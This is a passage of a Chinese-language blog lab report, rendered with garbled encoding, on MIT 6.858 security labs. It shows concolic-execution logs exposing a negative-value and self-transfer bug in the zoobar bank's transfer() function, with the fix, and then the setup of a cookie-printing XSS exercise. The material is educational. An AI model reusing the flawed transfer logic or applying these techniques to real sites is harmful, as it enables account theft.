&#123;&#x27;</span>form_recipient_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_val<span class="hljs-string">&#x27;: &#x27;</span>-<span class="hljs-number">10</span><span class="hljs-string">&#x27;, &#x27;</span>rsplit_split_cookie_=_r_<span class="hljs-comment">#_r&#x27;: &#x27;atok&#x27;, &#x27;rsplit_split_cookie_=_r_#_l&#x27;: &#x27;alice&#x27;, &#x27;split_cookie_=_r&#x27;: &#x27;alice#atok&#x27;, &#x27;split_cookie_=_l&#x27;: &#x27;PyZoobarLogin&#x27;, &#x27;cookie&#x27;: &#x27;PyZoobarLogin=alice#atok&#x27;, &#x27;path&#x27;: &#x27;fer&#x27;, &#x27;form_recipient_val&#x27;: &#x27;bob&#x27;, &#x27;referrer&#x27;: &#x27;&#x27;&#125;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1686</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;tex...</span><br><span class="hljs-string"># responseï¼Œæ¯”è¾ƒé•¿ä¸”æ— æ„ä¹‰ï¼Œè¿™é‡Œæš‚ä¸”çœç•¥</span><br><span class="hljs-string">WARNING: Zoobar theft detected</span><br></code></pre></td></tr></table></figure>

<p>å‚æ•°çš„å«ä¹‰ä¸éš¾è¾¨è®¤ï¼Œ<code>form_zoobars_val</code> ä¸ºå•æ¬¡ transfer çš„æ•°å€¼ï¼Œ<code>cookie</code> è¡¨ç¤ºå‘é€æ–¹ç”¨æˆ·ååŠ cookieï¼Œ<code>form_recipient_val</code> è¡¨ç¤ºæ¥æ”¶æ–¹ç”¨æˆ·åï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºè‡³å°‘å¯èƒ½å­˜åœ¨ä¸¤ä¸ªæ¼æ´ï¼š</p>
<ul>
<li>æœªå¯¹è´Ÿæ•°çš„ transfer è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ä¸€ä¸ªç”¨æˆ·å¯ä»¥ç›—å–å¦ä¸€ç”¨æˆ·çš„ balance</li>
<li>æœªå¯¹ self-transfer çš„æƒ…å†µåšåˆé€‚å¤„ç†ï¼Œå¯¼è‡´æœ€åæ€»çš„ balance ä¸ä¸€è‡´</li>
</ul>
<p>ä½†è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åªçŸ¥é“  <em>æ¼æ´æ˜¯å­˜åœ¨çš„</em>  ï¼Œè€Œä¸çŸ¥é“  <em>æ¼æ´åœ¨ä½•å¤„</em>  ï¼Œé‚£è¿™é‡Œæˆ‘ä»¬éœ€è¦å†å®¡ä¸€å®¡æ—¥å¿—åˆ«çš„åœ°æ–¹ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ä¼šæœ‰ä¸€äº›æŠ›å¼‚å¸¸çš„æ—¥å¿—ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/transfer.py&quot;</span>, line <span class="hljs-number">16</span>, <span class="hljs-keyword">in</span> transfer<br>    bank.transfer(g.user.person.username,<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/bank.py&quot;</span>, line <span class="hljs-number">12</span>, <span class="hljs-keyword">in</span> transfer<br>    recipient_balance = recipientp.zoobars + zoobars<br>AttributeError: <span class="hljs-string">&#x27;NoneType&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;zoobars&#x27;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1683</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n       </span><br><span class="hljs-string"># responseï¼Œæ¯”è¾ƒé•¿ä¸”æ— æ„ä¹‰ï¼Œè¿™é‡Œæš‚ä¸”çœç•¥</span><br></code></pre></td></tr></table></figure>

<p>è¯´æ˜ä¸»è¦çš„å¤„ç†é€»è¾‘åº”å½“æ˜¯åœ¨ <code>zoobar/bank.py</code> ä¸­çš„ <code>transfer()</code> å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä»£ç å®¡è®¡+ä¿®å¤ç¯èŠ‚äº†ï¼Œè¯¥å‡½æ•°çš„æ ¸å¿ƒé€»è¾‘ä¸»è¦å°±æ˜¯å¼€å¤´è¿™ä¸€æ®µï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    persondb = person_setup()<br>    senderp = persondb.query(Person).get(sender)<br>    recipientp = persondb.query(Person).get(recipient)<br><br>    sender_balance = senderp.zoobars - zoobars<br>    recipient_balance = recipientp.zoobars + zoobars<br><br>    <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError()<br><br>    senderp.zoobars = sender_balance<br>    recipientp.zoobars = recipient_balance<br>    persondb.commit()<br><br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºï¼š</p>
<ul>
<li>ç¼ºå¤±äº†å¯¹ transfer æ•°é‡ä¸ºè´Ÿçš„æ£€æŸ¥</li>
<li>é‡å¤èµ‹å€¼å¯¼è‡´å¯¹ self-transfer çš„æƒ…å†µè®¡ç®—é”™è¯¯</li>
</ul>
<p>ä¿®æ”¹çš„åŠæ³•å…¶å®æ¯”è¾ƒç®€å•ï¼Œç”±äº username ä¸ºä¸»é”®ï¼Œæ•…è‹¥ <code>sender == recipient</code>ï¼Œç›´æ¥è·³è¿‡è½¬è´¦æ“ä½œå³å¯ï¼ŒåŒæ—¶å¯¹ transfer æ•°é‡ä¸ºè´Ÿæ•°çš„æƒ…å†µç›´æ¥è½¬ä¸º 0 å³å¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    <span class="hljs-comment"># for zoobars &lt; 0, convert it to 0</span><br>    <span class="hljs-keyword">if</span> zoobars &lt; <span class="hljs-number">0</span>:<br>        zoobars = <span class="hljs-number">0</span><br>    <br>    <span class="hljs-comment"># if self-transfer, we don&#x27;t need to do anything</span><br>    <span class="hljs-keyword">if</span> sender != recipient:<br>        persondb = person_setup()<br>        senderp = persondb.query(Person).get(sender)<br>        recipientp = persondb.query(Person).get(recipient)<br><br>        sender_balance = senderp.zoobars - zoobars<br>        recipient_balance = recipientp.zoobars + zoobars<br><br>        <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> ValueError()<br><br>        senderp.zoobars = sender_balance<br>        recipientp.zoobars = recipient_balance<br>        persondb.commit()<br>    <br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡æ‰€æœ‰æ£€æŸ¥</p>
<p><img src="https://s2.loli.net/2022/12/25/GYVItmEXyuZCUfo.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è‡³æ­¤ï¼ŒLab 3 å…¨éƒ¨å®Œæˆ</p>
<h1 id="0x04-Lab-4-Browser-securityï¼ˆuncompletedï¼‰"><a href="#0x04-Lab-4-Browser-securityï¼ˆuncompletedï¼‰" class="headerlink" title="0x04.Lab 4: Browser securityï¼ˆuncompletedï¼‰"></a>0x04.Lab 4: Browser securityï¼ˆuncompletedï¼‰</h1><h2 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h2><p>æœ¬ Lab ä¸»è¦å¸¦å¤§å®¶åšåŸºäºæµè§ˆå™¨çš„æ”»å‡»ï¼ˆbrowser-based attacksï¼Œå…¶å®å°±æ˜¯ web æ‰‹ç©çš„é‚£ä¸€å¥—ï¼‰ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>Part 1ï¼šè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆcross-site scripting attackï¼ŒXSSï¼‰</li>
<li>Part 2ï¼šä¾§ä¿¡é“ä¸é’“é±¼æ”»å‡»ï¼ˆside channel and phishing attackï¼‰</li>
<li>Part 3ï¼šä¸€ä¸ªç®€å•çš„è •è™«ï¼ˆa profile wormï¼‰</li>
</ul>
<h2 id="Network-setup"><a href="#Network-setup" class="headerlink" title="Network setup"></a>Network setup</h2><p>å› ä¸ºæˆ‘ä»¬éœ€è¦åœ¨ web æµè§ˆå™¨æ„é€ æ”»å‡»ï¼Œä¸ºäº†ä¿è¯è¯„åˆ†ç³»ç»Ÿæ­£å¸¸ï¼Œæˆ‘ä»¬çš„ zoobar web æœåŠ¡å™¨å¿…é¡»è¦åœ¨ <code>http://localhost:8080/</code> ä¸Šè¿›è¡Œè®¿é—®</p>
<p><del>å¦‚æœä½ æ˜¯ä½¿ç”¨ KVM æˆ– VirtualBoxï¼Œè‡ªå·±å›å»ç¿»å®éªŒæ‰‹å†Œ</del>ï¼›å¦‚æœä½ ä½¿ç”¨ VMWareï¼Œæˆ‘ä»¬å°†é€šè¿‡ ssh è¿›è¡Œç«¯å£è½¬å‘</p>
<p>é¦–å…ˆæ‰¾åˆ°ä½ çš„è™šæ‹Ÿæœºçš„ IPï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip addr show dev eth0</span><br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/12/25/COioRUJdS81apIG.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å¯¹äº Mac å’Œ Linux ç”¨æˆ·ï¼Œåœ¨å®¿ä¸»æœºä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh -L localhost:8080:localhost:8080 student@VM-IP-ADDRESS</span><br>student@VM-IP-ADDRESS&#x27;s password: 6858<br></code></pre></td></tr></table></figure>

<p>å¯¹äº Windows ç”¨æˆ·ï¼Œ<del>æ²¡æ•‘äº†ç­‰æ­»å§</del>ï¼Œå¦‚æœä½ ç”¨çš„æ˜¯ PuTTYï¼Œå¯ä»¥æ ¹æ®è¿™äº›  <a target="_blank" rel="noopener" href="https://web.archive.org/web/20140811071925/http://www.cs.uu.nl/technical/services/ssh/putty/puttyfw.html">instructions</a> å®Œæˆè®¾ç½®ï¼Œ<del>å¦‚æœä½ ç”¨çš„æ˜¯ OpenSSH é‚£å°±ç­‰æ­»å§</del></p>
<h2 id="Web-browser"><a href="#Web-browser" class="headerlink" title="Web browser"></a>Web browser</h2><p>æœ¬ Lab æ¨èä½¿ç”¨  <a target="_blank" rel="noopener" href="https://www.mozilla.com/firefox/">Mozilla Firefox</a> ï¼Œ <del>è¯´æ˜¯ Firefox å¯ä»¥åœ¨è®¸å¤šç§OS ä¸Šè·‘ä½†ğŸ‘´å¯»æ€ Chrome ä¸ç…§æ ·èƒ½è€Œä¸”åº”ç”¨èŒƒå›´ä¸çŸ¥é“æ¯” Firefox å¤šå¤šå°‘äº†</del> ï¼Œè‹¥å¼€å¯äº† ad-blocking ç­‰æ’ä»¶åˆ™éœ€è¦å°†å…¶å…³é—­</p>
<h2 id="Setting-up-the-web-server"><a href="#Setting-up-the-web-server" class="headerlink" title="Setting up the web server"></a>Setting up the web server</h2><p>é¦–å…ˆè¿˜æ˜¯æŒ‰æƒ¯ä¾‹ä¿å­˜ Lab 3 çš„ç­”æ¡ˆï¼Œåˆ‡åˆ° Lab 4 åˆ†æ”¯ï¼Œmake ä¸€ä¸‹æ£€æŸ¥æœ‰æ²¡æœ‰é—®é¢˜ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~$ cd lab<br>student@vm-6858:~/lab$ git commit -am &#x27;my solution to lab3&#x27;<br>[lab3 c54dd4d] my solution to lab3<br> 1 files changed, 1 insertions(+), 0 deletions(-)<br>student@vm-6858:~/lab$ git pull<br>Already up-to-date.<br>student@vm-6858:~/lab$ git checkout -b lab4 origin/lab4<br>Branch lab4 set up to track remote branch lab4 from origin.<br>Switched to a new branch &#x27;lab4&#x27;<br>student@vm-6858:~/lab$ make<br>...<br></code></pre></td></tr></table></figure>

<p>ç„¶åæŒ‰æƒ¯ä¾‹ç”¨ä¸‹é¢çš„è¯­å¥åœ¨ 8080 ç«¯å£è·‘ zookdï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~/lab$ ./zookd 8080<br></code></pre></td></tr></table></figure>

<p>ç„¶ååœ¨  <code>http://localhost:8080/</code> å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ Zoobar é¡µé¢<del>è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„è€æ ·å­</del></p>
<p><img src="https://s2.loli.net/2022/12/25/dU7ZvOKPLX4mzs9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="Crafting-attacks"><a href="#Crafting-attacks" class="headerlink" title="Crafting attacks"></a>Crafting attacks</h2><p>æœ¬ Lab ä¸­æˆ‘ä»¬å°†ç”¨ä¸åŒçš„æ”»å‡»æ‰‹æ®µæ¥æ”»å‡» zoobarï¼Œè¯„æµ‹ç³»ç»Ÿå°†åœ¨æ¸…ç©ºæ³¨å†Œç”¨æˆ·æ•°æ®åº“ï¼ˆé™¤äº† <code>&quot;attacker&quot;</code> ç”¨æˆ·ï¼‰åè¿è¡Œæˆ‘ä»¬çš„æ”»å‡»è„šæœ¬ï¼Œä¸å‰é¢çš„ Lab ç±»ä¼¼çš„æ˜¯æˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡ <code>make check</code> æ¥è¿›è¡Œæ£€æŸ¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¯¥æ£€æŸ¥å¹¶ä¸å¤Ÿå½»åº•ï¼ˆå°¤å…¶æ˜¯å¯¹äºæ¡ä»¶ç«äº‰è€Œè¨€ï¼‰ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å¤šè¿è¡Œå‡ æ¬¡æ¥ç¡®è®¤æ”»å‡»æˆåŠŸ</p>
<p>å¯¹äº Exercise 5ã€13ã€14 ä¸ challenge è€Œè¨€ï¼Œ<code>make check</code> è„šæœ¬ä¸è¶³ä»¥çœ‹å‡ºç«™ç‚¹åœ¨æ”»å‡»å‰åçš„åŒºåˆ«ï¼Œå› æ­¤è¿™éœ€è¦æˆ‘ä»¬è‡ªè¡Œå®Œæˆå¯¹æ¯”ï¼ˆMIT çš„è€å¸ˆä¹Ÿä¼šæ‰‹åŠ¨å®Œæˆè¯„æµ‹ï¼Œ <del>ä»–çœŸçš„ğŸ‘´å“­æ­»</del> ï¼‰ï¼›<code>make check</code> åœ¨è¿è¡Œæ—¶ä¼šåœ¨ <code>lab4-tests/</code> ä¸‹ç”Ÿæˆæ”»å‡»é¡µé¢åº”æœ‰çš„å¤–è§‚çš„å›¾ç‰‡ï¼ˆ<code>answer-XX.ref.png</code>ï¼‰ä¸æˆ‘ä»¬çš„æ”»å‡»é¡µé¢çš„å®é™…çš„æ ·å­ï¼ˆ<code>answer-XX.png</code>ï¼‰ï¼Œæˆ‘ä»¬åº”å½“è¦ç¡®ä¿ä¸¤è€…åº”å½“ä¸€è‡´</p>
<h2 id="Part-1-a-cross-site-scripting-XSS-attack"><a href="#Part-1-a-cross-site-scripting-XSS-attack" class="headerlink" title="Part 1: a cross-site scripting (XSS) attack"></a>Part 1: a cross-site scripting (XSS) attack</h2><p>zoobar çš„ç”¨æˆ·ç•Œé¢æœ‰ä¸€ä¸ªèƒ½ä»ç™»å…¥ç”¨æˆ·çš„æµè§ˆå™¨çªƒå–å…¶ cookie çš„æ¼æ´ï¼ˆè‹¥æ”»å‡»è€…èƒ½è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è¿æ¥ï¼‰ï¼Œæˆ‘ä»¬çš„å·¥ä½œä¾¿æ˜¯æ„é€ è¿™æ ·ä¸€ä¸ªé“¾æ¥</p>
<p>éœ€æ±‚çš„å‰ç½®çŸ¥è¯†ï¼šJavascriptï¼ŒDOM ç­‰</p>
<p>æ¥ä¸‹æ¥æ˜¯ Exercise 1ï¼Œåœ¨  <code>answer-1.js</code> ä¸­ç¼–å†™æ”»å‡»è„šæœ¬æ‰“å°å‡ºç”¨æˆ·çš„ cookieï¼Œæœ¬åœ°æµ‹è¯•çš„è¯å°±ä¿ç•™ä¸€ä»½ <code>zoobar/templates/users.html</code> çš„æ‹·è´å¹¶æ·»åŠ   <code>&lt;script&gt;</code>  æ ‡ç­¾æ¥å¼•å…¥æ”»å‡»è„šæœ¬ï¼š</p>
<blockquote>
<p><strong>Exercise 1: Print cookie.</strong></p>
<p>Cookies are HTTPâ€™s main mechanism for tracking users across requests. If an attacker can get ahold of another userâ€™s cookie, they can completely impersonate that other user. For this exercise, your goal is simply to print the cookie of the currently logged-in user when they access the â€œUsersâ€ page.</p>
<ol>
<li><p>Read about how <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/document.cookie">cookies are accessed from Javascript</a>.</p>
</li>
<li><p>Save a copy of <code>zoobar/templates/users.html</code> (youâ€™ll need to restore this original version later). Add a <code>&lt;script&gt;</code> tag to <code>users.html</code> that prints the logged-in userâ€™s cookie using <code>alert()</code></p>
<p>Your script might not work immediately if you made a Javascript programming error. Fortunately, Chrome has fantastic debugging tools accessible in the Inspector: the JavaScript console, the DOM inspector, and the Network monitor. The JavaScript console lets you see which exceptions are being thrown and why. The DOM Inspector lets you peek at the structure of the page and the properties and methods of each node it contains. The Network monitor allows you to inspect the requests going between your browser and the website. By clicking on one of the requests, you can see what cookie your browser is sending, and compare it to what your script prints.</p>
</li>
<li><p>Put the contents of your script in a file named <code>answer-1.js</code>. Your file should only contain javascript (donâ€™t include <code>&lt;script&gt;</code> tags).</p>
</li>
</ol>
</blockquote>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/EXPERIMENTS/" class="category-chain-item">EXPERIMENTS</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">#ä¿¡æ¯å®‰å…¨</a>
      
        <a href="/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">#ç¬¦å·æ‰§è¡Œ</a>
      
        <a href="/tags/ret2libc/">#ret2libc</a>
      
        <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">#æ ˆæº¢å‡º</a>
      
        <a href="/tags/ret2shellcode/">#ret2shellcode</a>
      
        <a href="/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/">#å®éªŒç¬”è®°</a>
      
        <a href="/tags/MIT/">#MIT</a>
      
        <a href="/tags/Concolic-Execution/">#Concolic Execution</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>ã€EXPR.0x01ã€‘MIT 6.858 è¯¾ç¨‹å®éªŒæŠ¥å‘Š</div>
      <div>https://arttnba3.github.io/2022/12/25/EXPR-0X01-MIT_6_858/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>arttnba3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2022å¹´12æœˆ25æ—¥</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/01/11/CVE-0X09-CVE-2022-0185/" title="ã€CVE.0x09ã€‘CVE-2022-0185 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ã€CVE.0x09ã€‘CVE-2022-0185 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/11/24/ANGR-0X00-ANGR_CTF/" title="ã€ANGR.0x00ã€‘ä» angr-CTF å…¥é—¨ angr çš„åŸºæœ¬ç”¨æ³•">
                        <span class="hidden-mobile">ã€ANGR.0x00ã€‘ä» angr-CTF å…¥é—¨ angr çš„åŸºæœ¬ç”¨æ³•</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"è¯´ç‚¹ä»€ä¹ˆå‘—ï¼ˆç¬‘ï¼‰","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  <!-- ç½‘ç«™è¿è¡Œæ—¶é—´çš„è®¾ç½® -->
  <span id="timeDate">è½½å…¥å¤©æ•°...</span>
  <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span>
  <script>
      var now = new Date();
      function createtime() {
          var grt= new Date("04/20/2020 17:48:48");//æ­¤å¤„ä¿®æ”¹ä½ çš„å»ºç«™æ—¶é—´æˆ–è€…ç½‘ç«™ä¸Šçº¿æ—¶é—´
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
          document.getElementById("timeDate").innerHTML = "arttnba3çš„å°å±‹å·²ç»å®‰å…¨å­˜åœ¨äº† "+dnum+" å¤© ";
          document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’";
      }
  setInterval("createtime()",250);
  </script>
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="busuanzi_value_site_pv"></span>
         æ¬¡
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="busuanzi_value_site_uv"></span>
         äºº
      </span>
    
    
  
</div>

  
  
    <!-- å¤‡æ¡ˆä¿¡æ¯ ICP for China -->
    <div class="beian">
  <span>
